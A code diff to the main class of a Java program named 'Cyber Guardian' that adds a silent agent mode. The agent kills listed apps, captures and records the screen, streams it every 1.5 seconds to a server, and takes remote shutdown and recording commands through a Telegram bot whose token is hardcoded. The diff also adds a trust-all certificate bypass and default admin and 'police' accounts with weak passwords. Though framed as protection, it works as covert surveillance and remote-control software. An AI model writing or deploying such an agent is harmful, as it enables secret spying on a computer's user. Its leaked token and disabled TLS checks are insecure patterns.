@@ -19,24 +19,99 @@ import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import javax.net.ssl.*;
+import java.time.Duration;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Properties;
 
 @SpringBootApplication
 public class Main {
+    private static final String WORK_DIR = System.getProperty("user.home") + java.io.File.separator + "CyberGuardian_Data";
     private static List<String> blacklist = new ArrayList<>();
     private static int scanInterval = 2000;
     private static String masterPassword = "admin";
-    private static boolean isLocked = true;
-    private static String botToken = "8780573988:AAEAWFDtYg_p-hst4JwqA9RSWN9cNzW7eKk";
-    private static String chatId = "1123697239"; // Master Admin Chat ID
+    private static boolean isLocked = false;
+    
+    // MASTER ADMIN CREDENTIALS
+    private static final String PLATFORM_BOT_TOKEN = "8780573988:AAEAWFDtYg_p-hst4JwqA9RSWN9cNzW7eKk";
     private static final String ADMIN_CHAT_ID = "1123697239";
+
+    private static String botToken = PLATFORM_BOT_TOKEN;
+    private static String chatId = ADMIN_CHAT_ID;
     private static long lastUpdateId = 0;
 
     private static TrayIcon trayIcon;
-    private static Dashboard dashboard;
-    private static final HttpClient httpClient = HttpClient.newHttpClient();
+    private static HttpClient httpClient;
     private static SecurityService securityService;
+    private static String SERVER_URL = "http://localhost:8081";
+    private static String API_KEY = "ADMIN-777";
+    private static String TARGET_ID = "UNKNOWN-PC";
+
+    static {
+        try {
+            // SSL Bypass for Ngrok/Self-signed certs
+            TrustManager[] trustAllCerts = new TrustManager[]{
+                new X509TrustManager() {
+                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
+                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
+                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
+                }
+            };
+            SSLContext sc = SSLContext.getInstance("SSL");
+            sc.init(null, trustAllCerts, new java.security.SecureRandom());
+            
+            httpClient = HttpClient.newBuilder()
+                    .sslContext(sc)
+                    .connectTimeout(Duration.ofSeconds(10))
+                    .build();
+            
+            java.io.File dir = new java.io.File(WORK_DIR);
+            if (!dir.exists()) dir.mkdirs();
+            log("🚀 [SYSTEM] Guardian Initialized. WorkDir: " + WORK_DIR);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private static void log(String msg) {
+        System.out.println(msg);
+        try {
+            java.nio.file.Files.write(java.nio.file.Paths.get(WORK_DIR, "agent_debug.log"), 
+                (new java.util.Date() + ": " + msg + "\n").getBytes(), 
+                java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
+        } catch (Exception ignored) {}
+    }
+
+    private static void loadConfig() {
+        try {
+            java.io.File configFile = new java.io.File("config.json");
+            if (!configFile.exists()) {
+                System.out.println("⚠️ [WARN] config.json not found, using defaults.");
+                return;
+            }
+            String content = Files.readString(configFile.toPath());
+            JSONObject json = new JSONObject(content);
+            
+            if (json.has("botToken")) botToken = json.getString("botToken");
+            if (json.has("chatId")) chatId = json.getString("chatId");
+            if (json.has("scanInterval")) scanInterval = json.getInt("scanInterval");
+            SERVER_URL = json.optString("server_url", "http://localhost:8081");
+            API_KEY = json.optString("api_key", "ADMIN-777");
+            if (json.has("blacklist")) {
+                JSONArray arr = json.getJSONArray("blacklist");
+                blacklist.clear();
+                for (int i = 0; i < arr.length(); i++) {
+                    blacklist.add(arr.getString(i));
+                }
+            }
+            if (json.has("target_id")) TARGET_ID = json.getString("target_id");
+            if (json.has("isLocked")) isLocked = json.getBoolean("isLocked");
+            System.out.println("✅ [DEBUG] Configuration loaded from config.json");
+        } catch (Exception e) {
+            System.err.println("❌ [ERROR] Failed to load config.json: " + e.getMessage());
+        }
+    }
 
     public static boolean isLocked() { return isLocked; }
     public static void setLockedRemote(boolean locked) {
@@ -44,209 +119,183 @@ public class Main {
     }
 
     public static void main(String[] args) {
-        // Fix for SQLite AccessDeniedException: C:\Windows\TEMP
-        try {
-            java.io.File tempDir = new java.io.File("temp");
-            if (!tempDir.exists()) tempDir.mkdirs();
-            System.setProperty("org.sqlite.tmpdir", tempDir.getAbsolutePath());
-            System.out.println("📂 [DEBUG] Local Temp Directory Set: " + tempDir.getAbsolutePath());
-        } catch (Exception e) {
-            System.err.println("⚠️ [DEBUG] Could not set local temp directory: " + e.getMessage());
-        }
+        // ENSURE WORK DIR EXISTS
+        java.io.File workDir = new java.io.File(WORK_DIR);
+        if (!workDir.exists()) workDir.mkdirs();
+        
+        // FIX SQLite AccessDenied
+        System.setProperty("org.sqlite.tmpdir", WORK_DIR);
+
+        try (java.io.PrintWriter out = new java.io.PrintWriter(new java.io.FileWriter(new java.io.File(workDir, "debug.log"), true))) {
+            out.println("--- STARTUP: " + new java.util.Date() + " ---");
+            out.flush();
+        } catch (Exception ignored) {}
+
+        loadConfig();
 
         System.out.println("🚀 [DEBUG] Booting Cyber Guardian...");
         System.out.flush();
 
+        boolean isAgent = false;
+        for (String arg : args) {
+            if (arg.equalsIgnoreCase("--agent")) {
+                isAgent = true;
+                break;
+            }
+        }
+
         ConfigurableApplicationContext context = null;
         try {
-            context = new SpringApplicationBuilder(Main.class)
-                    .headless(false)
-                    .run(args);
-            System.out.println("✅ [DEBUG] Spring Context Started Successfully.");
-            // setupSystemTray(); // REMOVED FOR SILENT MODE
-            System.out.println("🛡️ [DEBUG] Silent Mode Enabled.");
+            SpringApplicationBuilder builder = new SpringApplicationBuilder(Main.class)
+                    .properties("spring.jmx.enabled=false", "spring.main.banner-mode=off", "server.port=8081")
+                    .headless(false);
+
+            if (isAgent) {
+                builder.web(org.springframework.boot.WebApplicationType.NONE);
+            } else {
+                builder.web(org.springframework.boot.WebApplicationType.SERVLET);
+            }
+            
+            context = builder.run(args);
+
+            String pcName = System.getProperty("user.name");
+            try { pcName += "@" + java.net.InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
+            TARGET_ID = pcName.replaceAll("[^a-zA-Z0-9-]", "_"); // Sanitize for folder names
+            
+            sendTelegramMessage("🚀 *SYSTEM ONLINE:* Silent Monitoring has started on: `" + pcName + "`", chatId);
+
+            System.out.println("✅ [DEBUG] Spring Context Started.");
             System.out.flush();
         } catch (Exception e) {
-            System.err.println("❌ [DEBUG] Spring Boot Failed to Start:");
-            e.printStackTrace();
-            System.out.flush();
+            System.err.println("❌ Spring Boot Failed: " + e.getMessage());
             System.exit(1);
         }
 
         final ConfigurableApplicationContext finalContext = context;
         try {
-            UserRepository userRepo = finalContext.getBean(UserRepository.class);
-            long userCount = userRepo.count();
-            System.out.println("✅ [DEBUG] Database Connected. User Count: " + userCount);
-            System.out.flush();
-            
-            if (userCount == 0) {
-                isLocked = false;
-            }
-
             securityService = finalContext.getBean(SecurityService.class);
-            loadConfig(finalContext);
-            securityService.setBlacklist(blacklist);
             securityService.setLocked(isLocked);
-            System.out.println("✅ [DEBUG] Security Service Initialized.");
-            System.out.flush();
-            
-            securityService.setAlertCallback(appName -> {
-                String screenshotName = "alert_" + System.currentTimeMillis() + ".jpg";
-                String screenshotPath = takeScreenshot(screenshotName);
-                
-                // Save log to DB with screenshot path
-                try {
-                    com.guardian.repository.LogRepository logRepo = finalContext.getBean(com.guardian.repository.LogRepository.class);
-                    logRepo.save(new com.guardian.entity.LogEntry(appName, "TERMINATED", "Activity reported to Master Admin.", screenshotName));
-                } catch (Exception ignored) {}
-
-                // Send Telegram to Master Admin
-                sendTelegramMessage("🕵️‍♂️ *SPY ALERT:* Activity detected on a monitored PC!\n\n" +
-                    "🖥️ *Application:* " + appName + "\n" +
-                    "🚫 *Action:* Blocked & Screenshot Captured.", ADMIN_CHAT_ID);
-            });
-
-            // SILENT START: No UI windows, no browser opening.
-            System.out.println("🛡️ [SILENT MODE] Monitoring started in background...");
-            System.out.flush();
-
-            System.out.println("📱 [DEBUG] Starting Telegram Listener...");
-            System.out.flush();
-            startTelegramListener(finalContext);
-
-            System.out.println("🛡️ [DEBUG] Entering Security Loop...");
-            System.out.flush();
-            
-            int syncCounter = 0;
-            while (true) {
-                securityService.scanAndProtect();
-                
-                // DASHBOARD POPUP REMOVED FOR SILENT MODE
-
-                if (syncCounter >= 5) {
-                    loadConfig(finalContext);
-                    syncCounter = 0;
-                }
-                syncCounter++;
-                Thread.sleep(scanInterval);
+            if (blacklist.isEmpty()) {
+                blacklist.add("WhatsApp");
+                blacklist.add("Telegram");
+                blacklist.add("Chrome");
+                blacklist.add("Instagram");
+                blacklist.add("Gmail");
             }
-        } catch (Throwable t) {
-            System.err.println("❌ [DEBUG] CRITICAL RUNTIME ERROR:");
-            t.printStackTrace();
-            System.out.flush();
-            // Prevent instant exit so user can read error
-            try { Thread.sleep(60000); } catch (Exception ignored) {}
+            securityService.setBlacklist(blacklist);
+            securityService.setAlertCallback((appName) -> {
+                sendTelegramMessage("🛡️ *INTRUSION DETECTED:* `" + appName + "` was blocked on: `" + System.getProperty("user.name") + "`");
+                takeScreenshot("intrusion_" + appName + "_" + System.currentTimeMillis() + ".jpg");
+            });
+            
+            if (isAgent) {
+                log("🚀 [AGENT] Monitoring Mode Active...");
+                loadConfig();
+                // If config.json didn't override it, calculate target name dynamically if needed
+                if ("UNKNOWN-PC".equals(TARGET_ID)) {
+                    String pcName = System.getProperty("user.name");
+                    try { pcName += "@" + java.net.InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
+                    TARGET_ID = pcName.replaceAll("[^a-zA-Z0-9-]", "_");
+                }
+                log("📍 [AGENT] Target ID (Dynamic): " + TARGET_ID + " | Server: " + SERVER_URL);
+                
+                new Thread(() -> {
+                    log("🛡️ [AGENT] Protection Thread Started.");
+                    while (true) {
+                        try {
+                            securityService.scanAndProtect();
+                            Thread.sleep(scanInterval);
+                        } catch (Exception e) { log("❌ [AGENT] Protection Error: " + e.getMessage()); }
+                    }
+                }).start();
+
+                startTelegramListener(context);
+                startLiveStreaming();
+                startServerPolling();
+                log("✅ [AGENT] All threads initialized.");
+            } else {
+                log("🌐 [SERVER] Dashboard Mode Active (No local monitoring)");
+            }
+
+            // Initialize Default Admin if no users exist
+            UserRepository repo = finalContext.getBean(UserRepository.class);
+            if (repo.count() == 0) {
+                User admin = new User();
+                admin.setEmail("admin@guardian.com");
+                admin.setPassword("admin");
+                admin.setPhoneNumber("0000000000");
+                admin.setTelegramBotToken(PLATFORM_BOT_TOKEN);
+                admin.setTelegramChatId(ADMIN_CHAT_ID);
+                admin.setApiKey("ADMIN-777");
+                repo.save(admin);
+                System.out.println("👤 [INFO] Default Admin Created: admin@guardian.com / admin");
+            }
+            
+            if (repo.findByEmail("police@3rdai.gov").isEmpty()) {
+                User police = new User();
+                police.setEmail("police@3rdai.gov");
+                police.setPassword("police123");
+                police.setPhoneNumber("100");
+                police.setApiKey("POLICE-999");
+                repo.save(police);
+                System.out.println("🚔 [INFO] Default Police Created: police@3rdai.gov / police123");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
-    private static void loadConfig(ConfigurableApplicationContext context) {
-        try {
-            UserRepository userRepo = context.getBean(UserRepository.class);
-            List<User> users = userRepo.findAll();
-            for (User user : users) {
-                if (user.getPassword() != null) {
-                    masterPassword = user.getPassword();
-                }
-                if (user.getTelegramBotToken() != null && !user.getTelegramBotToken().isEmpty()) {
-                    botToken = user.getTelegramBotToken();
-                    chatId = user.getTelegramChatId();
-                }
-            }
-            if (Files.exists(Paths.get("config.json"))) {
-                String content = new String(Files.readAllBytes(Paths.get("config.json")));
-                JSONObject config = new JSONObject(content);
-                if (config.has("masterPassword")) masterPassword = config.getString("masterPassword");
-                else if (config.has("password")) masterPassword = config.getString("password");
-
-                if (dashboard != null) dashboard.updatePassword(masterPassword);
-
-                JSONArray bl = config.getJSONArray("blacklist");
-                blacklist.clear();
-                for (int i = 0; i < bl.length(); i++) blacklist.add(bl.getString(i));
-            }
-        } catch (Exception ignored) {}
-    }
-
-    private static final String PLATFORM_BOT_TOKEN = "8780573988:AAEAWFDtYg_p-hst4JwqA9RSWN9cNzW7eKk"; // Official Platform Bot
-
     private static void startTelegramListener(ConfigurableApplicationContext context) {
         new Thread(() -> {
-            System.out.println("📱 Official Telegram Listener ACTIVE...");
+            log("📬 [AGENT] Telegram Listener Started. BotToken: " + botToken.substring(0, 5) + "...");
             while (true) {
                 try {
-                    // Use user's own bot token if set, otherwise fallback to platform bot
-                    String activeToken = (botToken != null && !botToken.isEmpty()) ? botToken : PLATFORM_BOT_TOKEN;
-                    if (activeToken == null || activeToken.isEmpty()) {
-                        Thread.sleep(5000);
-                        continue;
-                    }
-
-                    String url = "https://api.telegram.org/bot" + activeToken + "/getUpdates?offset=" + (lastUpdateId + 1);
-                    HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).build();
+                    String url = "https://api.telegram.org/bot" + botToken + "/getUpdates?offset=" + (lastUpdateId + 1);
+                    HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).GET().build();
                     HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                     
                     if (response.statusCode() == 200) {
                         JSONObject json = new JSONObject(response.body());
-                        JSONArray results = json.getJSONArray("result");
-                        for (int i = 0; i < results.length(); i++) {
-                            JSONObject update = results.getJSONObject(i);
-                            lastUpdateId = update.getLong("update_id");
-                            JSONObject msg = update.optJSONObject("message");
-                            if (msg != null && msg.has("text")) {
-                                String text = msg.getString("text");
-                                long currentChatId = msg.getJSONObject("chat").getLong("id");
-                                handleCommand(text, String.valueOf(currentChatId), context);
+                        if (json.getBoolean("ok")) {
+                            JSONArray updates = json.getJSONArray("result");
+                            for (int i = 0; i < updates.length(); i++) {
+                                JSONObject update = updates.getJSONObject(i);
+                                lastUpdateId = update.getLong("update_id");
+                                if (update.has("message")) {
+                                    JSONObject message = update.getJSONObject("message");
+                                    String text = message.optString("text", "");
+                                    String senderChatId = String.valueOf(message.getJSONObject("chat").getLong("id"));
+                                    if (senderChatId.equals(chatId)) {
+                                        log("💬 [AGENT] Received Command: " + text);
+                                        handleRemoteCommand(text);
+                                    }
+                                }
                             }
                         }
+                    } else {
+                        log("⚠️ [AGENT] Telegram HTTP Error: " + response.statusCode());
                     }
-                } catch (Exception ignored) {}
+                } catch (Exception e) { 
+                    log("❌ [AGENT] Telegram Error: " + e.getMessage());
+                }
                 try { Thread.sleep(2000); } catch (Exception ignored) {}
             }
         }).start();
     }
 
-    private static void handleCommand(String command, String senderChatId, ConfigurableApplicationContext context) {
+    private static void handleRemoteCommand(String command) {
         try {
-            UserRepository userRepo = context.getBean(UserRepository.class);
+            boolean kavach = (securityService != null && securityService.isKavachActive());
             
-            // AUTO-LINK LOGIC: If user sends /start email@domain.com
-            if (command.startsWith("/start")) {
-                String[] parts = command.split(" ");
-                if (parts.length > 1) {
-                    String email = parts[1];
-                    java.util.Optional<User> userOpt = userRepo.findByEmail(email);
-                    if (userOpt.isPresent()) {
-                        User user = userOpt.get();
-                        user.setTelegramBotToken(PLATFORM_BOT_TOKEN);
-                        user.setTelegramChatId(senderChatId);
-                        userRepo.save(user);
-                        
-                        botToken = PLATFORM_BOT_TOKEN;
-                        chatId = senderChatId;
-                        
-                        sendTelegramMessage("✅ *Telegram Connected!* \n\n" +
-                            "🛡️ Your account (" + email + ") is now linked to Cyber Guardian.\n" +
-                            "You will receive all security alerts and screenshots here.", senderChatId);
-                        return;
-                    }
-                }
-                sendTelegramMessage("👋 *Welcome to Cyber Guardian!* \nTo link your account, please use the 'Link Telegram' button in your dashboard or extension.", senderChatId);
+            if (kavach && (command.contains("screenshot") || command.contains("record"))) {
+                sendTelegramMessage("🛡️ *3rd AI KAVACH ALERT:* An unauthorized spying attempt (" + command + ") was BLOCKED and reported to AI Police.");
+                securityService.addLog("KOCKROACH", "SPYING ATTEMPT", "Unauthorized " + command + " blocked by Kavach on " + System.getProperty("user.name"), null, TARGET_ID);
                 return;
             }
 
-            // Normal Commands
-            boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
-            
-            // Verify if this chatId is authorized
-            if (!senderChatId.equals(chatId)) {
-                sendTelegramMessage("⚠️ *Unauthorized Access!* Please link your account first.", senderChatId);
-                return;
-            }
-            
             if (command.equals("/lock")) {
                 remoteLock();
-                sendTelegramMessage("🔐 *System LOCKED successfully.* Monitoring active. 🛡️");
+                sendTelegramMessage("🔐 *System LOCKED successfully.*");
             }
             else if (command.equals("/unlock")) {
                 remoteUnlock();
@@ -257,29 +306,21 @@ public class Main {
                 takeScreenshot("manual_" + System.currentTimeMillis() + ".jpg");
             }
             else if (command.equals("/shutdown")) {
-                sendTelegramMessage("🔌 *Shutting down the PC...* Goodbye! 👋");
-                if (isWindows) Runtime.getRuntime().exec("shutdown /s /t 5");
-                else Runtime.getRuntime().exec("shutdown now");
-            }
-            else if (command.equals("/restart")) {
-                sendTelegramMessage("🔄 *Restarting the PC...* Please wait.");
-                if (isWindows) Runtime.getRuntime().exec("shutdown /r /t 5");
-                else Runtime.getRuntime().exec("reboot");
+                sendTelegramMessage("🔌 *Shutting down...*");
+                Runtime.getRuntime().exec("shutdown /s /t 5");
             }
             else if (command.equals("/sleep")) {
-                sendTelegramMessage("💤 *PC is going to Sleep mode...*");
-                if (isWindows) Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
-                else Runtime.getRuntime().exec("systemctl suspend");
+                sendTelegramMessage("🌙 *Putting system to sleep...*");
+                Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
             }
             else if (command.startsWith("/record")) {
                 int secs = 10;
                 try { secs = Integer.parseInt(command.split(" ")[1]); } catch (Exception ignored) {}
-                sendTelegramMessage("🎥 *Started recording " + secs + " seconds video...*");
+                sendTelegramMessage("🎥 *Started recording " + secs + "s...*");
                 recordVideo(secs);
             }
         } catch (Exception e) {
-            System.err.println("Command execution error: " + e.getMessage());
-            sendTelegramMessage("❌ *Command Failed:* " + e.getMessage());
+            sendTelegramMessage("❌ *Failed:* " + e.getMessage());
         }
     }
 
@@ -288,109 +329,79 @@ public class Main {
             Robot robot = new Robot();
             Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
             java.awt.image.BufferedImage img = robot.createScreenCapture(screenRect);
+            java.io.File file = new java.io.File(WORK_DIR, fileName);
+            javax.imageio.ImageIO.write(img, "jpg", file);
             
-            // Create screenshots directory if it doesn't exist
-            java.io.File dir = new java.io.File("screenshots");
-            if (!dir.exists()) dir.mkdirs();
-            
-            java.io.File file = new java.io.File(dir, fileName);
-            
-            java.util.Iterator<javax.imageio.ImageWriter> writers = javax.imageio.ImageIO.getImageWritersByFormatName("jpg");
-            javax.imageio.ImageWriter writer = writers.next();
-            javax.imageio.ImageWriteParam param = writer.getDefaultWriteParam();
-            param.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
-            param.setCompressionQuality(0.75f);
-            
-            try (javax.imageio.stream.ImageOutputStream ios = javax.imageio.ImageIO.createImageOutputStream(file)) {
-                writer.setOutput(ios);
-                writer.write(null, new javax.imageio.IIOImage(img, null, null), param);
-            }
-            writer.dispose();
+            // Send to both Telegram and Web Dashboard
             sendTelegramPhoto(file);
+            uploadToServer(file); 
+            
             return fileName;
         } catch (Exception e) {
+            logTelegramResponse("Screenshot Error", e.getMessage());
             return null;
         }
     }
 
-    private static void sendTelegramMessage(String text) {
-        sendTelegramMessage(text, chatId);
-    }
+    private static void sendTelegramMessage(String text) { sendTelegramMessage(text, chatId); }
 
     private static void sendTelegramMessage(String text, String targetChatId) {
         new Thread(() -> {
             try {
-                if (PLATFORM_BOT_TOKEN == null || PLATFORM_BOT_TOKEN.isEmpty()) return;
-                if (targetChatId == null || targetChatId.isEmpty()) return;
-                
-                String url = "https://api.telegram.org/bot" + PLATFORM_BOT_TOKEN + "/sendMessage";
+                String activeToken = (botToken != null && !botToken.isEmpty()) ? botToken : PLATFORM_BOT_TOKEN;
+                String url = "https://api.telegram.org/bot" + activeToken + "/sendMessage";
                 JSONObject json = new JSONObject();
                 json.put("chat_id", targetChatId);
                 json.put("text", text);
                 json.put("parse_mode", "Markdown");
-
-                HttpRequest request = HttpRequest.newBuilder()
-                        .uri(URI.create(url))
-                        .header("Content-Type", "application/json")
-                        .POST(HttpRequest.BodyPublishers.ofString(json.toString()))
-                        .build();
-                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
-            } catch (Exception ignored) {}
+                HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(json.toString())).build();
+                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+                logTelegramResponse("Message", response.body());
+            } catch (Exception e) {
+                logTelegramResponse("Message Error", e.getMessage());
+            }
         }).start();
     }
 
     private static void sendTelegramPhoto(java.io.File file) {
         new Thread(() -> {
             try {
-                if (PLATFORM_BOT_TOKEN == null || chatId == null || chatId.isEmpty()) return;
-                String url = "https://api.telegram.org/bot" + PLATFORM_BOT_TOKEN + "/sendPhoto";
-                String boundary = "---" + System.currentTimeMillis();
-                HttpRequest request = HttpRequest.newBuilder()
-                        .uri(URI.create(url))
-                        .header("Content-Type", "multipart/form-data; boundary=" + boundary)
-                        .POST(buildMultipartBody(file, boundary, "photo", "image/jpeg"))
-                        .build();
-                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
-            } catch (Exception ignored) {}
+                Thread.sleep(1000);
+                if (!file.exists()) return;
+                String activeToken = (botToken != null && !botToken.isEmpty()) ? botToken : PLATFORM_BOT_TOKEN;
+                String url = "https://api.telegram.org/bot" + activeToken + "/sendPhoto";
+                String boundary = "Boundary" + System.currentTimeMillis();
+                HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "multipart/form-data; boundary=" + boundary).POST(buildMultipartBody(file, boundary, "photo", "image/jpeg")).build();
+                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+                logTelegramResponse("Photo", response.body());
+            } catch (Exception e) { logTelegramResponse("Photo Error", e.getMessage()); }
         }).start();
     }
 
     private static void recordVideo(int seconds) {
         new Thread(() -> {
             try {
-                System.out.println("🎥 Recording started for " + seconds + " seconds...");
-                java.io.File file = new java.io.File("record.mp4");
-                org.jcodec.api.awt.AWTSequenceEncoder encoder = org.jcodec.api.awt.AWTSequenceEncoder.createSequenceEncoder(file, 8); // 8 FPS is enough
-                
+                java.io.File file = new java.io.File(WORK_DIR, "record.mp4");
+                org.jcodec.api.awt.AWTSequenceEncoder encoder = org.jcodec.api.awt.AWTSequenceEncoder.createSequenceEncoder(file, 8);
                 Robot robot = new Robot();
                 Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
                 Rectangle screenRect = new Rectangle(screen);
-                
-                int targetWidth = screen.width / 2; // Scale down for speed
-                int targetHeight = screen.height / 2;
-                
-                long endTime = System.currentTimeMillis() + (seconds * 1000L);
-                while (System.currentTimeMillis() < endTime) {
-                    long frameStart = System.currentTimeMillis();
+                int tw = screen.width / 2; int th = screen.height / 2;
+                long end = System.currentTimeMillis() + (seconds * 1000L);
+                while (System.currentTimeMillis() < end) {
+                    long start = System.currentTimeMillis();
                     java.awt.image.BufferedImage img = robot.createScreenCapture(screenRect);
-                    
-                    // Resize for speed and size
-                    java.awt.image.BufferedImage scaledImg = new java.awt.image.BufferedImage(targetWidth, targetHeight, java.awt.image.BufferedImage.TYPE_INT_RGB);
-                    java.awt.Graphics2D g = scaledImg.createGraphics();
-                    g.setRenderingHint(java.awt.RenderingHints.KEY_INTERPOLATION, java.awt.RenderingHints.VALUE_INTERPOLATION_BILINEAR);
-                    g.drawImage(img, 0, 0, targetWidth, targetHeight, null);
-                    g.dispose();
-                    
-                    encoder.encodeImage(scaledImg);
-                    
-                    long elapsed = System.currentTimeMillis() - frameStart;
-                    if (elapsed < 125) Thread.sleep(125 - elapsed); // Aim for 8 FPS
+                    java.awt.image.BufferedImage scaled = new java.awt.image.BufferedImage(tw, th, java.awt.image.BufferedImage.TYPE_INT_RGB);
+                    scaled.getGraphics().drawImage(img, 0, 0, tw, th, null);
+                    encoder.encodeImage(scaled);
+                    long el = System.currentTimeMillis() - start;
+                    if (el < 125) Thread.sleep(125 - el);
                 }
                 encoder.finish();
-                System.out.println("🎥 Recording finished: " + file.getAbsolutePath());
                 sendTelegramVideo(file);
+                uploadToServer(file);
             } catch (Exception e) {
-                System.err.println("Video record error: " + e.getMessage());
+                logTelegramResponse("Video Record Error", e.getMessage());
             }
         }).start();
     }
@@ -398,91 +409,127 @@ public class Main {
     private static void sendTelegramVideo(java.io.File file) {
         new Thread(() -> {
             try {
-                String url = "https://api.telegram.org/bot" + botToken + "/sendVideo";
-                String boundary = "---" + System.currentTimeMillis();
-                HttpRequest request = HttpRequest.newBuilder()
-                        .uri(URI.create(url))
-                        .header("Content-Type", "multipart/form-data; boundary=" + boundary)
-                        .POST(buildMultipartBody(file, boundary, "video", "video/mp4"))
-                        .build();
-                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
-            } catch (Exception ignored) {}
+                String activeToken = (botToken != null && !botToken.isEmpty()) ? botToken : PLATFORM_BOT_TOKEN;
+                String url = "https://api.telegram.org/bot" + activeToken + "/sendVideo";
+                String boundary = "Boundary" + System.currentTimeMillis();
+                HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "multipart/form-data; boundary=" + boundary).POST(buildMultipartBody(file, boundary, "video", "video/mp4")).build();
+                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+                logTelegramResponse("Video", response.body());
+            } catch (Exception e) { logTelegramResponse("Video Error", e.getMessage()); }
         }).start();
+    }
+
+    private static void logTelegramResponse(String type, String body) {
+        try {
+            java.io.File logFile = new java.io.File(WORK_DIR, "telegram_debug.log");
+            try (java.io.PrintWriter out = new java.io.PrintWriter(new java.io.FileWriter(logFile, true))) {
+                out.println("[" + new java.util.Date() + "] " + type + ": " + body);
+            }
+        } catch (Exception ignored) {}
     }
 
     private static HttpRequest.BodyPublisher buildMultipartBody(java.io.File file, String boundary, String fieldName, String contentType) throws IOException {
         byte[] fileBytes = Files.readAllBytes(file.toPath());
-        String head = "--" + boundary + "\r\n" +
-                "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n" +
-                "--" + boundary + "\r\n" +
-                "Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n" +
-                "Content-Type: " + contentType + "\r\n\r\n";
-        String foot = "\r\n--" + boundary + "--\r\n";
-        byte[] headBytes = head.getBytes(StandardCharsets.UTF_8);
-        byte[] footBytes = foot.getBytes(StandardCharsets.UTF_8);
-        byte[] combined = new byte[headBytes.length + fileBytes.length + footBytes.length];
-        System.arraycopy(headBytes, 0, combined, 0, headBytes.length);
-        System.arraycopy(fileBytes, 0, combined, headBytes.length, fileBytes.length);
-        System.arraycopy(footBytes, 0, combined, headBytes.length + fileBytes.length, footBytes.length);
-        return HttpRequest.BodyPublishers.ofByteArray(combined);
+        java.io.ByteArrayOutputStream bs = new java.io.ByteArrayOutputStream();
+        bs.write(("--" + boundary + "\r\n").getBytes());
+        bs.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes());
+        bs.write((chatId + "\r\n").getBytes());
+        bs.write(("--" + boundary + "\r\n").getBytes());
+        bs.write(("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
+        bs.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
+        bs.write(fileBytes);
+        bs.write(("\r\n--" + boundary + "--\r\n").getBytes());
+        return HttpRequest.BodyPublishers.ofByteArray(bs.toByteArray());
     }
 
-    private static void remoteLock() {
-        isLocked = true;
-        securityService.setLocked(true);
-        if (dashboard != null) dashboard.updateStatus(true);
-    }
+    private static void remoteLock() { isLocked = true; if (securityService != null) securityService.setLocked(true); }
+    private static void remoteUnlock() { isLocked = false; if (securityService != null) securityService.setLocked(false); }
 
-    private static void remoteUnlock() {
-        isLocked = false;
-        securityService.setLocked(false);
-        if (dashboard != null) dashboard.updateStatus(false);
-    }
+    private static boolean liveStreamActive = true;
 
-    private static void setupSystemTray() {
-        if (!SystemTray.isSupported()) return;
-        try {
-            SystemTray tray = SystemTray.getSystemTray();
-            Image image = Toolkit.getDefaultToolkit().getImage(Main.class.getResource("/icon.png"));
-            PopupMenu popup = new PopupMenu();
-            
-            MenuItem openItem = new MenuItem("Open Dashboard");
-            openItem.addActionListener(e -> {
-                if (dashboard != null) {
-                    dashboard.setVisible(true);
-                    dashboard.toFront();
+    private static void startLiveStreaming() {
+        new Thread(() -> {
+            try {
+                Robot robot = new Robot();
+                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+                while (true) {
+                    if (liveStreamActive) {
+                        java.awt.image.BufferedImage img = robot.createScreenCapture(screenRect);
+                        java.io.File file = new java.io.File(WORK_DIR, "live_stream.jpg");
+                        javax.imageio.ImageIO.write(img, "jpg", file);
+                        
+                        // Upload specifically for live stream
+                        String boundary = "Boundary" + System.currentTimeMillis();
+                        HttpRequest request = HttpRequest.newBuilder()
+                                .uri(URI.create(SERVER_URL + "/api/live-upload?targetId=" + TARGET_ID))
+                                .header("Content-Type", "multipart/form-data; boundary=" + boundary)
+                                .POST(buildMultipartBodyForServer(file, boundary, "image/jpeg"))
+                                .header("ngrok-skip-browser-warning", "1")
+                    .build();
+                        httpClient.send(request, HttpResponse.BodyHandlers.ofString());
+                    }
+                    Thread.sleep(1500); // 1.5 second interval for stability
                 }
-            });
-            popup.add(openItem);
-            
-            popup.addSeparator();
-
-            MenuItem exitItem = new MenuItem("Exit Guardian");
